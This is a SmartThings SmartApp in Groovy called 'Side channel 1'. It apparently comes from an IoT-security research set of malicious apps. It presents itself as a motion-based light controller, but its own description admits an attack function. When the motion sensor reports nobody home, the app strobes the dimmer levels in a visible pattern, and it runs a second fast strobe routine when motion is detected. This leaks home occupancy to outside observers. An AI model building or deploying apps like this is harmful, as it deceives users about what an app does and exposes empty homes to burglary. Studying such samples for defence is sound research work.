definition(

    name: "Side channel 1",

    namespace: "csl",

    author: "Amit Sikder",

    updated: "Leo Babun",

    description: "To make your light controlling smart, this light controller could control the light according to your motion detected by motionsensor. If there is no motion detected by the sensor this app strobe the lights (a specific on/off pattern) to indicate that there are nobody in the home. Attack function is implemented from line 343 to 381. The condition of the attack is given in line 271 and 323. ",

    category: "Safety & Security",

    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",

    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",

    iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

 

 

preferences {

       section("Title") {

               input "themotionsensor", "capability.motionSensor", title: "Where?"

         input "minutes", "number", required: true, title: "Minutes?"

         //input "myswitch", "capability.switch", title: "switch?"

         input "myswitch", "capability.switchLevel", title:"switchlevel?", multiple: true

 

       }

}

 

def installed() {

       log.debug "Installed with settings: ${settings}"

 

       initialize()

}

 

def updated() {

       log.debug "Updated with settings: ${settings}"

 

       unsubscribe()

       initialize()

}

 

def initialize() {

       //subscribe(themotionsensor, "motion", myHandler)

    subscribe(themotionsensor, "motion.active", motionDetectedHandler)

    subscribe(themotionsensor, "motion.inactive", motionStoppedHandler)

}

 

def myHandler(evt) {

       //state.switchState = myswitch.currentState("level").value

       //def switchState = myswitch.currentState("level")

    try{

          log.debug "attack"

              runIn(60*minutes,changeIntensity,[overwrite: false])

      

    }

    catch(e) {

          log.debug e

    }

}

 

def changeIntensity() {

       //def switchState = myswitch.currentState("level")

       //def add = true

   

    def value = myswitch.currentState("level").value.first().toInteger()

   

   

    if(state.motionDetected==true) {

          myswitch.setLevel(80)

        log.debug "stop attack. value:"

    }

   

    log.debug "value now:$value"

   

  

    if(state.motionDetected==false) {

          if(value<=20) {

                 state.add=true

             myswitch.setLevel(value+20)

             log.debug "$value+20"

            }

          if(value>20&&value<80&& state.add) {

             myswitch.setLevel(value+20)

             log.debug "$value+20" 

          }

        if(value>=80) {

            state.add = false;

            myswitch.setLevel(value-20)

            log.debug "$value-20"

        }

        if(value>20&value<80&&!state.add) {

            myswitch.setLevel(value-20)

            log.debug "$value-20"

        }

        runIn(60*0.1,changeIntensity,[overwrite: false])

    }

   

  

}

 

////

def changeIntensity1() {

       //def switchState = myswitch.currentState("level")

       //def add = true

   

    def value = myswitch.currentState("level").value.first().toInteger()

   

   

  

    log.debug "value now:$value"

   

  

 

    if(value<=20) {

        state.add=true

        myswitch.setLevel(value+60)

        log.debug "$value+60"

    }

    if(value>20&&value<80&& state.add) {

        myswitch.setLevel(value+20)

        log.debug "$value+20" 

    }

    if(value>=80) {

        state.add = false;

        myswitch.setLevel(value-60)

        log.debug "$value-60"

    }

    if(value>20&value<80&&!state.add) {

        myswitch.setLevel(value-20)

        log.debug "$value-20"

    }

    runIn(0.5,changeIntensity1,[overwrite: false])

 

   

  

}

///

 

def motionDetectedHandler(evt) {

       state.motionDetected = true

     log.debug "motionDetectedHandler called--home!!!"

     myswitch.setLevel(80)

     attackFunction1()

    // log.debug "home:$myswitch.currentState("level").value.first().toInteger()"

}

 

def motionStoppedHandler(evt) {

    log.debug "motionStoppedHandler called"

    runIn(60 * minutes, checkMotion)

}

 

def checkMotion() {

    log.debug "In checkMotion scheduled method"

 

    def motionState = themotionsensor.currentState("motion")

 

    if (motionState.value == "inactive") {

        // get the time elapsed between now and when the motion reported inactive

        def elapsed = now() - motionState.date.time

 

        // elapsed time is in milliseconds, so the threshold must be converted to milliseconds too

        def threshold = 1000 * 60 * (minutes-0.1)

 

        if (elapsed >= threshold) {

            log.debug " ($elapsed ms):  not home!!!"

            myswitch.setLevel(0)

            state.motionDetected = false

            //log.debug "not home:$myswitch.currentState("level").value.first().toInteger()"

            attackFunction()

        } else {

            log.debug "still home"

        }

    } else {

        // Motion active; just log it and do nothing

        log.debug "Home"

    }

}

 

def attackFunction() {

       try{

          log.debug "attack"

              runIn(60*0.1,changeIntensity,[overwrite: false])

      

    }

    catch(e) {

          log.debug e

    }

}

def attackFunction1() {

       try{

          log.debug "attack1"

              runIn(60*0.1,changeIntensity1,[overwrite: false])

      

    }

    catch(e) {

          log.debug e

    }

}
